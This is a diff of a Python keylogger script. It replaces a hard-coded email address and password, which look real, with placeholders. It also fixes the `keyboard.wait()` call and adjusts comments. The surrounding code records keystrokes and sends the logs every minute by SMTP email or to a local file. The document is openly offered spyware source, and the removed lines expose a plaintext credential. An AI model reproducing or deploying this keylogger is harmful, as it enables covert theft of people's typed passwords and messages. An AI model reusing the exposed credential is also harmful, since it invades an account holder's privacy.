@@ -5,8 +5,8 @@ from threading import Timer
 from datetime import datetime
 
 SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "md.94752780@outlook.com"
-EMAIL_PASSWORD = "Carl-Mar94Moller80"
+EMAIL_ADDRESS = "put_real_address_here@gmail.com"
+EMAIL_PASSWORD = "put_real_pw"
 
 
 class Keylogger:
@@ -61,7 +61,7 @@ class Keylogger:
         print(f"[+] Saved {self.filename}.txt")
 
     def sendmail(self, email, password, message):
-        # manages a connection to the SMTP server
+        # manages a connection to an SMTP server
         server = smtplib.SMTP(host="smtp.gmail.com", port=587)
         # connect to the SMTP server as TLS mode ( for security )
         server.starttls()
@@ -104,12 +104,12 @@ class Keylogger:
         # start reporting the keylogs
         self.report()
         # block the current thread, wait until CTRL+C is pressed
-        keyboard.wait
+        keyboard.wait()
 
 
 if __name__ == "__main__":
     # if you want a keylogger to send to your email
-    #keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
     # if you want a keylogger to record keylogs to a local file
     # (and then send it using your favorite method)
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
